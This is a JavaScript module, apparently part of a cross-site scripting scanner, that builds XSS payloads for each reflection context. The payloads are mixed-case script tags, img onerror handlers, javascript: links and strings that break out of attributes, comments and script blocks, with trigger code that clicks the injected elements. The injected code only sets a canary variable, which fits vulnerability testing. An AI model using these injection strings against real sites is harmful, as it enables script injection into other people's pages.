const config = require('./config');
const {callFunctionCode} = require('./utils');

const reflectionTypes = {
    HTML_TAG: 'html_tag',
    HTML_NORMAL_ATTRIBUTE: 'html_normal_attribute',
    HTML_HREF_ATTRIBUTE: 'html_href_attribute',
    HTML_EXECUTABLE_ATTRIBUTE: 'html_executable_attribute',
    HTML_COMMENT: 'html_comment',
    SCRIPT: 'script',
};

function generateRandomJsKeySelector(length = 6) {
    const charCodes = config.payloadVariablePrefix.split('').map(c => c.charCodeAt(0)).join();
    const randomNumber = Math.random().toString().slice(-length);
    return `[${charCodes}].map(String.fromCharCode).join()+${randomNumber}`;
}

function generateRandomClass(length = 6) {
    return `${config.payloadClassPrefix}${Math.random().toString().slice(-length)}`;
}

const clickElementWithClass = className => {
    let elements = document.getElementsByClassName(className);
    for (let i = 0; i < elements.length; i++) {
        elements.item(i).click();
    }
    return elements.length;
};

function getTriggerCodeForClass(className) {
    return callFunctionCode(clickElementWithClass, className);
}

const triggerElementWithCode = code => {
    let found = false;
    let logs = [];

    function log(type, text) {
        logs.push({
            type,
            text,
        });
    }

    function find(node, parent) {
        switch (node.nodeType) {
            case 1:
                break;
            case 2:
                if (node.nodeValue.includes(code)) {
                    let funcName = node.nodeName === 'href' ? 'click' : node.nodeName;
                    if (typeof parent[funcName] === 'function') {
                        try {
                            found = true;
                            parent[funcName]();
                        } catch (e) {
                            log('info', 'found code but threw an error');
                            log('debug', 'found code but threw an error.\n' +
                                `attribute name: ${node.nodeName}\n` +
                                `code: ${parent[funcName] && parent[funcName].toString()}\n`
                                + e.toString());
                        }
                    } else {
                        log('info', 'found code but not a function');
                        log('debug', 'found code but not a function.\n' +
                            `attribute name: ${node.nodeName}\n` +
                            `value type: ${typeof parent[funcName]}\n` +
                            `value type: ${parent[funcName]}`);
                    }
                }
                return;
            default:
                return;
        }
        if (node.hasChildNodes()) {
            node.childNodes.forEach(function (child) {
                return find(child, node)
            });
        }
        for (let i = 0; i < node.attributes.length; i++) {
            find(node.attributes[i], node);
        }
    }

    find(document.children[0]);
    if (!found) {
        log('info', 'did not found code.');
    }
    return logs;
}

function getTriggerCodeForCode(jsCode) {
    return callFunctionCode(triggerElementWithCode, jsCode);
}

function generatePayloadCode(reflection) {
    const variableName = generateRandomJsKeySelector();
    const jsCode = `window[${variableName}]=1;`;
    const assert = `return window[${variableName}]`;

    const scriptTag = `<scRiPT>${jsCode}</SCrIpT>`;
    const imgTag = `<img src="/" onerror="${jsCode}">`;

    const tagClass = generateRandomClass();
    const aTag = `<a class="${tagClass}" href="jaVascRIPt:void(${jsCode});"></a>`;
    const pTag = `<p class="${tagClass}" onclick="${jsCode}"></p>`;
    const tagTrigger = getTriggerCodeForClass(tagClass);

    switch (reflection.type) {
        case  reflectionTypes.HTML_TAG:
            return [{
                payload: scriptTag,
                assert,
            }, {
                payload: imgTag,
                assert,
            }, {
                payload: aTag,
                trigger: tagTrigger,
                assert,
            }, {
                payload: pTag,
                trigger: tagTrigger,
                assert,
            },];
        case reflectionTypes.HTML_NORMAL_ATTRIBUTE:
            return [{
                payload: `">${scriptTag}`,
                assert,
            }, {
                payload: `">${imgTag}`,
                assert,
            }, {
                payload: `">${aTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `">${pTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${scriptTag}<${reflection.parentName} ${reflection.nodeName}="`,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${imgTag}<${reflection.parentName} ${reflection.nodeName}="`,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${aTag}<${reflection.parentName} ${reflection.nodeName}="`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${pTag}<${reflection.parentName} ${reflection.nodeName}="`,
                trigger: tagTrigger,
                assert,
            },];
        case reflectionTypes.HTML_HREF_ATTRIBUTE:
            return [{
                payload: `JAvaSCriPt:${jsCode}`,
                trigger: getTriggerCodeForCode(`JAvaSCriPt:${jsCode}`),
                assert,
            }, {
                payload: `">${scriptTag}`,
                assert,
            }, {
                payload: `">${imgTag}`,
                assert,
            }, {
                payload: `">${aTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `">${pTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `">${scriptTag}<a href="`,
                assert,
            }, {
                payload: `">${imgTag}<a href="`,
                assert,
            }, {
                payload: `">${aTag}<a href="`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `">${pTag}<a href="`,
                trigger: tagTrigger,
                assert,
            },];
        case reflectionTypes.HTML_EXECUTABLE_ATTRIBUTE:
            return [{
                payload: jsCode,
                trigger: getTriggerCodeForCode(jsCode),
                assert,
            }, {
                payload: `JAvaSCriPt:${jsCode}`,
                trigger: getTriggerCodeForCode(`JAvaSCriPt:${jsCode}`),
                assert,
            }, {
                payload: `">${scriptTag}`,
                assert,
            }, {
                payload: `">${imgTag}`,
                assert,
            }, {
                payload: `">${aTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `">${pTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${scriptTag}<${reflection.parentName} ${reflection.nodeName}="`,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${imgTag}<${reflection.parentName} ${reflection.nodeName}="`,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${aTag}<${reflection.parentName} ${reflection.nodeName}="`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `"></${reflection.parentName}>${pTag}<${reflection.parentName} ${reflection.nodeName}="`,
                trigger: tagTrigger,
                assert,
            },];
        case reflectionTypes.HTML_COMMENT:
            return [{
                payload: ` -->${scriptTag}<!-- `,
                assert,
            }, {
                payload: ` -->${imgTag}<!-- `,
                assert,
            }, {
                payload: ` -->${aTag}<!-- `,
                trigger: tagTrigger,
                assert,
            }, {
                payload: ` -->${pTag}<!-- `,
                trigger: tagTrigger,
                assert,
            },];
        case reflectionTypes.SCRIPT:
            return [{
                payload: ` ${jsCode} `,
                assert,
            }, {
                payload: `</ScRiPt>${scriptTag}`,
                assert,
            }, {
                payload: `</ScRiPt>${imgTag}`,
                assert,
            }, {
                payload: `</ScRiPt>${aTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `</ScRiPt>${pTag}`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `</ScRiPt>${scriptTag}<ScrIPt>`,
                assert,
            }, {
                payload: `</ScRiPt>${imgTag}<ScrIPt>`,
                assert,
            }, {
                payload: `</ScRiPt>${aTag}<ScrIPt>`,
                trigger: tagTrigger,
                assert,
            }, {
                payload: `</ScRiPt>${pTag}<ScrIPt>`,
                trigger: tagTrigger,
                assert,
            },];
    }
    return [];
}

function generatePayloads(reflections) {
    return reflections
        .map(generatePayloadCode)
        .reduce((all, current) => all.concat(current));
}

module.exports = generatePayloads;